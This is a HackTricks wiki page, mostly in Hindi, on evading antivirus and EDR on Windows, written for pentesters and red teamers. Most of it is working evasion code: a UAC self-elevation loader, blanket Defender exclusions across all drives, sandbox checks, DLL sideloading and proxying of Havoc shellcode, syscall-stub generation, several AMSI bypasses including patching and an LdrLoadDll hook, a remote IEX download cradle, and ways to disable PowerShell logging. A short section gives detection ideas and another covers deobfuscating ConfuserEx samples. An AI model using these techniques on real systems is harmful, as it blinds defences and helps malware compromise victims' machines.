# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**This page was initially written by** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender को काम करने से रोकने वाला tool.
- [no-defender](https://github.com/es3n1n/no-defender): Windows Defender को काम करने से रोकने वाला tool, जो दूसरे AV का fake बनाता है.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait before tampering with Defender

Public loaders जो game cheats के रूप में masquerade करते हैं, अक्सर unsigned Node.js/Nexe installers के रूप में ship होते हैं जो पहले **user से elevation मांगते हैं** और उसके बाद ही Defender को neuter करते हैं। Flow simple है:

1. `net session` के साथ administrative context probe करें। यह command केवल तभी succeed होती है जब caller के पास admin rights हों, इसलिए failure का मतलब है कि loader standard user के रूप में चल रहा है।
2. तुरंत `RunAs` verb के साथ खुद को relaunch करें ताकि original command line को preserve करते हुए expected UAC consent prompt trigger हो सके।
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
पीड़ित पहले से ही मानते हैं कि वे “cracked” software इंस्टॉल कर रहे हैं, इसलिए prompt आमतौर पर स्वीकार कर लिया जाता है, जिससे malware को Defender’s policy बदलने के लिए जरूरी rights मिल जाते हैं।

### हर drive letter के लिए Blanket `MpPreference` exclusions

एक बार elevated होने के बाद, GachiLoader-style chains service को सीधे disable करने के बजाय Defender blind spots को अधिकतम करते हैं। loader पहले GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) को kill करता है और फिर **extremely broad exclusions** push करता है ताकि हर user profile, system directory, और removable disk unscannable बन जाए:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
मुख्य अवलोकन:

- loop हर mounted filesystem (D:\, E:\, USB sticks, आदि) पर चलता है, इसलिए **disk पर कहीं भी future payload drop किया जाए, उसे ignore किया जाता है**।
- `.sys` extension exclusion future-looking है—attackers बाद में unsigned drivers load करने का option reserve करते हैं, बिना Defender को फिर से touch किए।
- सभी changes `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` के under land करते हैं, जिससे बाद के stages confirm कर सकते हैं कि exclusions persist कर रहे हैं या UAC को फिर से trigger किए बिना उन्हें expand कर सकते हैं।

क्योंकि कोई Defender service stop नहीं होती, naïve health checks फिर भी “antivirus active” report करते रहते हैं, जबकि real-time inspection उन paths को कभी touch ही नहीं करता।

## **AV Evasion Methodology**

Currently, AVs file के malicious होने या न होने की जांच के लिए अलग-अलग methods use करते हैं: static detection, dynamic analysis, और ज्यादा advanced EDRs के लिए behavioural analysis।

### **Static detection**

Static detection known malicious strings या byte arrays को binary या script में flag करके, और file से information extract करके भी achieve होती है (e.g. file description, company name, digital signatures, icon, checksum, आदि)। इसका मतलब है कि known public tools use करने पर आप आसानी से caught हो सकते हैं, क्योंकि उन्हें शायद पहले ही analyze करके malicious flag कर दिया गया होगा। इस तरह की detection से बचने के कुछ तरीके हैं:

- **Encryption**

अगर आप binary encrypt करते हैं, तो AV के पास आपके program को detect करने का कोई way नहीं होगा, लेकिन आपको program को memory में decrypt और run करने के लिए किसी तरह का loader चाहिए होगा।

- **Obfuscation**

कभी-कभी बस binary या script में कुछ strings बदलने से ही AV से बचा जा सकता है, लेकिन यह task समय लेने वाला हो सकता है, यह इस पर depend करता है कि आप क्या obfuscate करना चाहते हैं।

- **Custom tooling**

अगर आप अपने खुद के tools develop करते हैं, तो कोई known bad signatures नहीं होंगे, लेकिन इसमें काफी time और effort लगता है।

> [!TIP]
> Windows Defender static detection check करने का एक अच्छा तरीका [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) है। यह basically file को multiple segments में split करता है और फिर Defender को हर segment separately scan करने के लिए task करता है; इस तरह यह आपको ठीक-ठीक बता सकता है कि आपके binary में कौन-सी strings या bytes flagged हैं।

मैं strongly recommend करता हूँ कि आप practical AV Evasion के बारे में यह [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) देखें।

### **Dynamic analysis**

Dynamic analysis तब होती है जब AV आपके binary को sandbox में run करता है और malicious activity पर नजर रखता है (e.g. browser passwords decrypt करके पढ़ने की कोशिश, LSASS पर minidump करना, आदि)। यह हिस्सा काम करने के लिए थोड़ा trickier हो सकता है, लेकिन sandboxes को evade करने के लिए आप कुछ चीजें कर सकते हैं।

- **Sleep before execution** यह implementation पर depend करता है, लेकिन AV की dynamic analysis bypass करने का यह एक great तरीका हो सकता है। AVs के पास files scan करने के लिए बहुत कम time होता है ताकि user workflow disturb न हो, इसलिए long sleeps binaries के analysis को बाधित कर सकते हैं। Problem यह है कि कई AV sandboxes sleep को बस skip कर सकती हैं, यह implementation पर depend करता है।
- **Checking machine's resources** आम तौर पर Sandboxes के पास काम करने के लिए बहुत कम resources होते हैं (e.g. < 2GB RAM), वरना वे user की machine slow कर सकते हैं। यहाँ आप काफी creative भी हो सकते हैं, जैसे CPU temperature या fan speeds check करना, क्योंकि sandbox में सब कुछ implement नहीं होगा।
- **Machine-specific checks** अगर आप ऐसे user को target करना चाहते हैं जिसकी workstation "contoso.local" domain में joined है, तो आप computer के domain पर check कर सकते हैं कि वह आपके specified domain से match करता है या नहीं; अगर नहीं करता, तो आप अपने program को exit करा सकते हैं।

पता चला है कि Microsoft Defender के Sandbox computername HAL9TH है, इसलिए आप detonation से पहले अपने malware में computer name check कर सकते हैं; अगर name HAL9TH match करता है, तो इसका मतलब है कि आप defender's sandbox के अंदर हैं, इसलिए आप अपने program को exit करा सकते हैं।

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes के खिलाफ [@mgeeky](https://twitter.com/mariuszbit) से कुछ और बहुत अच्छे tips

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

जैसा कि हमने इस post में पहले कहा है, **public tools** eventually **detect** हो जाएंगे, इसलिए आपको खुद से एक सवाल पूछना चाहिए:

For example, अगर आप LSASS dump करना चाहते हैं, **तो क्या आपको सच में mimikatz use करने की जरूरत है**? या आप कोई different project use कर सकते हैं जो कम known हो और LSASS भी dump करता हो।

सही जवाब probably दूसरा वाला है। mimikatz को example के तौर पर लें, तो यह शायद AVs और EDRs द्वारा सबसे ज्यादा flagged malware pieces में से एक है, अगर सबसे ज्यादा flagged नहीं भी। खुद project बहुत cool है, लेकिन AVs से बचने के लिए इसके साथ काम करना भी बहुत nightmare है, इसलिए जो आप achieve करना चाहते हैं उसके लिए बस alternatives ढूँढें।

> [!TIP]
> जब आप evasion के लिए अपने payloads modify करें, तो Defender में **automatic sample submission बंद** करना सुनिश्चित करें, और कृपया, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** अगर आपका goal long run में evasion achieve करना है। अगर आप check करना चाहते हैं कि आपका payload किसी particular AV द्वारा detect होता है या नहीं, तो उसे VM पर install करें, automatic sample submission बंद करने की कोशिश करें, और वहाँ test करें जब तक आप result से satisfied न हों।

## EXEs vs DLLs

जब भी possible हो, हमेशा **evasion के लिए DLLs use करने को prioritize करें**, मेरे अनुभव में, DLL files आम तौर पर **काफी कम detect** और analyze होती हैं, इसलिए कुछ cases में detection से बचने के लिए यह एक बहुत simple trick है (बशर्ते आपके payload को DLL के रूप में run करने का कोई way हो)।

जैसा कि हम इस image में देख सकते हैं, antiscan.me पर Havoc payload की DLL detection rate 4/26 है, जबकि EXE payload की detection rate 7/26 है।

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

अब हम कुछ tricks दिखाएंगे जिन्हें आप DLL files के साथ use करके बहुत ज्यादा stealthy बन सकते हैं।

## DLL Sideloading & Proxying

**DLL Sideloading** loader द्वारा इस्तेमाल किए जाने वाले DLL search order का फायदा उठाता है, जिसमें victim application और malicious payload(s) दोनों को एक साथ रखा जाता है।

आप [Siofra](https://github.com/Cybereason/siofra) और निम्न powershell script का उपयोग करके DLL Sideloading के लिए susceptible programs check कर सकते हैं:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
यह कमांड "C:\Program Files\\" के अंदर DLL hijacking के लिए susceptible programs की list और वे जिन DLL files को load करने की कोशिश करते हैं, उसे output करेगा।

मैं highly recommend करता हूँ कि आप **DLL Hijackable/Sideloadable programs खुद explore करें**, यह technique सही तरीके से करने पर काफी stealthy होती है, लेकिन अगर आप publicly known DLL Sideloadable programs का use करते हैं, तो आप आसानी से पकड़े जा सकते हैं।

सिर्फ एक malicious DLL को उस name से place करने पर जो program load करना चाहता है, आपका payload load नहीं होगा, क्योंकि program उस DLL के अंदर कुछ specific functions expect करता है। इस issue को fix करने के लिए, हम **DLL Proxying/Forwarding** नाम की एक और technique use करेंगे।

**DLL Proxying** program द्वारा proxy (और malicious) DLL से किए गए calls को original DLL तक forward करता है, जिससे program की functionality बनी रहती है और आपके payload का execution handle किया जा सकता है।

मैं [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project from [@flangvik](https://twitter.com/Flangvik/) का use करूँगा

मैंने ये steps follow किए:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
अंतिम command हमें 2 files देगा: एक DLL source code template, और original renamed DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

हमारा shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) और proxy DLL दोनों का [antiscan.me](https://antiscan.me) में 0/26 Detection rate है! मैं इसे सफलता कहूँगा।

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> मैं **बहुत ज़्यादा recommend** करता हूँ कि आप [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) को DLL Sideloading के बारे में देखें और साथ ही [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) भी देखें, ताकि आप उन बातों के बारे में और अधिक गहराई से सीख सकें जिन पर हमने चर्चा की है।

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules ऐसे functions export कर सकते हैं जो असल में "forwarders" होते हैं: code की ओर point करने के बजाय, export entry में `TargetDll.TargetFunc` format की एक ASCII string होती है। जब कोई caller export को resolve करता है, तो Windows loader करेगा:

- अगर `TargetDll` पहले से loaded नहीं है, तो उसे load करेगा
- उससे `TargetFunc` resolve करेगा

समझने लायक मुख्य behaviors:
- अगर `TargetDll` एक KnownDLL है, तो वह protected KnownDLLs namespace से supply किया जाता है (जैसे ntdll, kernelbase, ole32)।
- अगर `TargetDll` एक KnownDLL नहीं है, तो normal DLL search order use होता है, जिसमें उस module की directory भी शामिल होती है जो forward resolution कर रहा है।

यह एक indirect sideloading primitive enable करता है: एक signed DLL ढूँढें जो किसी function को ऐसे module name पर forward करती हो जो KnownDLL न हो, फिर उस signed DLL को attacker-controlled DLL के साथ एक ही जगह रखें जिसका नाम forwarded target module के exactly बराबर हो। जब forwarded export invoke होता है, loader forward resolve करता है और आपकी DLL को उसी directory से load करता है, जिससे आपका DllMain execute होता है।

Windows 11 पर देखा गया example:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` एक KnownDLL नहीं है, इसलिए इसे normal search order के माध्यम से resolve किया जाता है।

PoC (copy-paste):
1) signed system DLL को एक writable folder में copy करें
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) उसी फ़ोल्डर में एक malicious `NCRYPTPROV.dll` डालें। code execution पाने के लिए एक minimal DllMain पर्याप्त है; DllMain को trigger करने के लिए आपको forwarded function implement करने की जरूरत नहीं है।
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) एक signed LOLBin के साथ forward को trigger करें:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) side-by-side `keyiso.dll` (signed) को लोड करता है
- `KeyIsoSetAuditingInterface` को resolve करते समय, loader forward को `NCRYPTPROV.SetAuditingInterface` तक follow करता है
- फिर loader `C:\test` से `NCRYPTPROV.dll` लोड करता है और उसका `DllMain` execute करता है
- अगर `SetAuditingInterface` implement नहीं है, तो आपको "missing API" error `DllMain` पहले ही run हो जाने के बाद मिलेगा

Hunting tips:
- ऐसे forwarded exports पर focus करें जहाँ target module कोई KnownDLL न हो। KnownDLLs `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` के तहत listed होते हैं।
- आप forwarded exports को tooling जैसे इनके साथ enumerate कर सकते हैं:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- उम्मीदवारों की खोज के लिए Windows 11 forwarder inventory देखें: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- LOLBins (जैसे, rundll32.exe) द्वारा non-system paths से signed DLLs लोड करने, और उसके बाद उसी directory से समान base name वाली non-KnownDLLs लोड करने पर monitor करें
- ऐसे process/module chains पर alert करें जैसे: `rundll32.exe` → non-system `keyiso.dll` → user-writable paths के तहत `NCRYPTPROV.dll`
- code integrity policies (WDAC/AppLocker) लागू करें और application directories में write+execute को deny करें

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze एक payload toolkit है जो suspended processes, direct syscalls, और alternative execution methods का उपयोग करके EDRs को bypass करता है`

आप अपने shellcode को stealthy तरीके से load और execute करने के लिए Freeze का उपयोग कर सकते हैं.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion सिर्फ़ एक cat & mouse game है, आज जो काम करता है कल detect हो सकता है, इसलिए सिर्फ़ एक tool पर कभी rely न करें; अगर संभव हो, तो multiple evasion techniques को chain करने की कोशिश करें।

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs अक्सर `ntdll.dll` syscall stubs पर **user-mode inline hooks** लगाते हैं। इन hooks को bypass करने के लिए, आप **direct** या **indirect** syscall stubs generate कर सकते हैं, जो सही **SSN** (System Service Number) load करते हैं और hooked export entrypoint execute किए बिना kernel mode में transition करते हैं।

**Invocation options:**
- **Direct (embedded)**: generated stub में `syscall`/`sysenter`/`SVC #0` instruction emit करें (कोई `ntdll` export hit नहीं).
- **Indirect**: `ntdll` के अंदर मौजूद किसी `syscall` gadget में jump करें ताकि kernel transition `ntdll` से originate होता दिखे (heuristic evasion के लिए useful); **randomized indirect** हर call के लिए pool से एक gadget चुनता है।
- **Egg-hunt**: disk पर static `0F 05` opcode sequence embed करने से बचें; runtime पर syscall sequence resolve करें।

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: stub bytes read करने के बजाय syscall stubs को virtual address के अनुसार sort करके SSNs infer करें।
- **SyscallsFromDisk**: clean `\KnownDlls\ntdll.dll` map करें, उसके `.text` से SSNs read करें, फिर unmap करें (memory में मौजूद सभी hooks bypass होते हैं).
- **RecycledGate**: जब stub clean हो, तब opcode validation के साथ VA-sorted SSN inference combine करें; अगर hooked हो, तो VA inference पर fall back करें।
- **HW Breakpoint**: `syscall` instruction पर DR0 set करें और runtime पर `EAX` से SSN capture करने के लिए VEH use करें, बिना hooked bytes parse किए।

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI को "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" को रोकने के लिए बनाया गया था। शुरू में, AVs केवल **disk पर files** scan कर सकते थे, इसलिए अगर आप somehow payloads को **directly in-memory** execute कर पाते, तो AV उसे रोकने के लिए कुछ नहीं कर सकता था, क्योंकि उसके पास पर्याप्त visibility नहीं थी।

AMSI feature Windows के इन components में integrated है।

- User Account Control, या UAC (EXE, COM, MSI, या ActiveX installation का elevation)
- PowerShell (scripts, interactive use, और dynamic code evaluation)
- Windows Script Host (wscript.exe और cscript.exe)
- JavaScript और VBScript
- Office VBA macros

यह antivirus solutions को script contents को एक ऐसे form में expose करके script behavior inspect करने देता है जो unencrypted और unobfuscated दोनों होता है।

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` चलाने पर Windows Defender पर निम्न alert आएगा।

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि यह पहले `amsi:` prepends करता है और फिर उस executable का path जोड़ता है जिससे script run हुई, इस case में, powershell.exe

हमने disk पर कोई file drop नहीं की, लेकिन फिर भी in-memory में पकड़े गए क्योंकि AMSI था।

इसके अलावा, **.NET 4.8** से शुरू करके, C# code भी AMSI के through run होता है। इससे `Assembly.Load(byte[])` पर भी असर पड़ता है ताकि in-memory execution load हो सके। इसलिए AMSI evade करना हो तो in-memory execution के लिए .NET के lower versions (जैसे 4.7.2 या उससे नीचे) use करने की सलाह दी जाती है।

AMSI को bypass करने के कुछ तरीके हैं:

- **Obfuscation**

क्योंकि AMSI mainly static detections पर काम करता है, इसलिए जिन scripts को आप load करने की कोशिश करते हैं उन्हें modify करना detection evade करने का अच्छा तरीका हो सकता है।

हालांकि, AMSI scripts को unobfuscate करने की capability रखता है, भले ही उसमें multiple layers हों, इसलिए obfuscation कैसे की गई है इस पर निर्भर करते हुए यह एक खराब option हो सकता है। इससे इसे evade करना इतना straightforward नहीं रहता। फिर भी, कभी-कभी आपको बस कुछ variable names बदलने होते हैं और काम हो जाता है, इसलिए यह इस बात पर depend करता है कि किसी चीज़ को कितना flag किया गया है।

- **AMSI Bypass**

चूंकि AMSI powershell (साथ ही cscript.exe, wscript.exe, आदि.) process में एक DLL load करके implement किया गया है, इसलिए बिना privileged user के रूप में भी इसे आसानी से tamper किया जा सकता है। AMSI की implementation में इस flaw के कारण, researchers ने AMSI scanning evade करने के कई तरीके खोजे हैं।

**Forcing an Error**

AMSI initialization को fail (amsiInitFailed) करवाने पर current process के लिए कोई scan initiate नहीं होगा। मूल रूप से यह [Matt Graeber](https://twitter.com/mattifestation) द्वारा disclosed किया गया था और Microsoft ने wider usage को रोकने के लिए एक signature develop किया है।
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
AMSI को वर्तमान powershell process के लिए unusable बनाने के लिए सिर्फ powershell code की एक line काफी थी। बेशक, इस line को AMSI ने itself flag कर दिया था, इसलिए इस technique का उपयोग करने के लिए कुछ modification की जरूरत है।

यहाँ एक modified AMSI bypass है जिसे मैंने इस [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) से लिया था।
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
ध्यान रखें, कि यह संभवतः इस post के बाहर आते ही flag हो जाएगा, इसलिए यदि आपकी योजना undetected रहने की है तो कोई code publish नहीं करना चाहिए।

**Memory Patching**

इस technique को सबसे पहले [@RastaMouse](https://twitter.com/_RastaMouse/) ने discover किया था और इसमें amsi.dll में "AmsiScanBuffer" function का address ढूँढना शामिल है (जो user-supplied input को scan करने के लिए जिम्मेदार है) और इसे ऐसे instructions से overwrite करना कि E_INVALIDARG का code return हो, इस तरह actual scan का result 0 return करेगा, जिसे clean result के रूप में interpret किया जाता है।

> [!TIP]
> अधिक विस्तृत explanation के लिए कृपया [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) पढ़ें।

PowerShell के साथ AMSI bypass करने के लिए कई अन्य techniques भी हैं, इन्हें जानने के लिए [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) और [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) देखें।

### amsi.dll load को रोककर AMSI को block करना (LdrLoadDll hook)

AMSI केवल तब initialize होता है जब `amsi.dll` current process में load हो जाता है। एक robust, language-agnostic bypass यह है कि `ntdll!LdrLoadDll` पर एक user-mode hook लगाया जाए जो तब error return करे जब requested module `amsi.dll` हो। परिणामस्वरूप, AMSI कभी load नहीं होता और उस process के लिए कोई scan नहीं होता।

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- PowerShell, WScript/CScript और custom loaders सभी पर काम करता है (कोई भी चीज़ जो otherwise AMSI लोड करती)।
- stdin के जरिए scripts feed करने के साथ pair करें (`PowerShell.exe -NoProfile -NonInteractive -Command -`) ताकि long command-line artefacts से बचा जा सके।
- LOLBins के through execute किए गए loaders में देखा गया है (जैसे, `regsvr32` `DllRegisterServer` को call करता है)।

Tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** भी AMSI bypass करने के लिए script generate करता है।
Tool **[https://amsibypass.com/](https://amsibypass.com/)** भी AMSI bypass करने के लिए script generate करता है, जो randomized user-defined function, variables, characters expression के जरिए signature से बचता है और PowerShell keywords पर random character casing apply करता है ताकि signature से बचा जा सके।

**Detected signature हटाएँ**

आप **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** और **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** जैसे tool का उपयोग current process की memory से detected AMSI signature हटाने के लिए कर सकते हैं। यह tool current process की memory में AMSI signature को scan करके काम करता है और फिर उसे NOP instructions से overwrite कर देता है, जिससे वह memory से effectively हट जाता है।

**AMSI का उपयोग करने वाले AV/EDR products**

आप **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** में AMSI का उपयोग करने वाले AV/EDR products की list पा सकते हैं।

**Powershell version 2 का उपयोग करें**
अगर आप PowerShell version 2 use करते हैं, तो AMSI load नहीं होगा, इसलिए आप अपनी scripts को AMSI द्वारा scan किए बिना चला सकते हैं। आप यह कर सकते हैं:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging एक feature है जो आपको system पर execute होने वाले सभी PowerShell commands को log करने देता है। यह auditing और troubleshooting के लिए उपयोगी हो सकता है, लेकिन यह **उन attackers के लिए भी problem हो सकता है जो detection से बचना चाहते हैं**।

PowerShell logging bypass करने के लिए, आप निम्न techniques use कर सकते हैं:

- **Disable PowerShell Transcription and Module Logging**: आप इस purpose के लिए [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) जैसे tool का use कर सकते हैं।
- **Use Powershell version 2**: अगर आप PowerShell version 2 use करते हैं, तो AMSI load नहीं होगा, इसलिए आप अपने scripts को AMSI द्वारा scan किए बिना run कर सकते हैं। आप यह कर सकते हैं: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: बिना defenses वाले powershell को spawn करने के लिए [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) use करें (यही `powerpick` from Cobal Strike use करता है)。


## Obfuscation

> [!TIP]
> कई obfuscation techniques data को encrypt करने पर rely करती हैं, जिससे binary की entropy बढ़ जाएगी और AVs और EDRs के लिए इसे detect करना आसान हो जाएगा। इसके साथ सावधान रहें और शायद केवल अपने code के specific sections पर ही encryption apply करें जो sensitive हैं या जिन्हें hidden रखना जरूरी है।

### Deobfuscating ConfuserEx-Protected .NET Binaries

जब ConfuserEx 2 (या commercial forks) use करने वाले malware का analysis किया जाता है, तो अक्सर protection की कई layers मिलती हैं जो decompilers और sandboxes को block कर देती हैं। नीचे दिया गया workflow reliably **near–original IL को restore** करता है, जिसे बाद में dnSpy या ILSpy जैसे tools में C# में decompile किया जा सकता है।

1.  Anti-tampering removal – ConfuserEx हर *method body* को encrypt करता है और उसे *module* static constructor (`<Module>.cctor`) के अंदर decrypt करता है। यह PE checksum को भी patch करता है, इसलिए कोई भी modification binary को crash कर देगा। Encrypted metadata tables locate करने, XOR keys recover करने और एक clean assembly rewrite करने के लिए **AntiTamperKiller** use करें:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output में 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) होते हैं, जो अपना unpacker build करते समय उपयोगी हो सकते हैं।

2.  Symbol / control-flow recovery – *clean* file को **de4dot-cex** (de4dot का ConfuserEx-aware fork) में feed करें।
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profile select करें
• de4dot control-flow flattening को undo करेगा, original namespaces, classes और variable names restore करेगा और constant strings decrypt करेगा।

3.  Proxy-call stripping – ConfuserEx direct method calls को lightweight wrappers (a.k.a *proxy calls*) से replace करता है ताकि decompilation और टूट जाए। इन्हें **ProxyCall-Remover** से हटाएँ:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
इस step के बाद आपको `Convert.FromBase64String` या `AES.Create()` जैसी normal .NET API दिखाई देनी चाहिए, opaque wrapper functions (`Class8.smethod_10`, …) के बजाय।

4.  Manual clean-up – resulting binary को dnSpy में run करें, बड़े Base64 blobs या `RijndaelManaged`/`TripleDESCryptoServiceProvider` use को search करें ताकि *real* payload locate हो सके। अक्सर malware इसे `<Module>.byte_0` के अंदर initialize किए गए TLV-encoded byte array के रूप में store करता है।

ऊपर दिया गया chain malicious sample को run किए बिना execution flow को **restore** करता है – offline workstation पर काम करते समय यह useful है।

> 🛈  ConfuserEx `ConfusedByAttribute` नाम का एक custom attribute produce करता है, जिसे samples को automatically triage करने के लिए IOC के रूप में use किया जा सकता है।

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
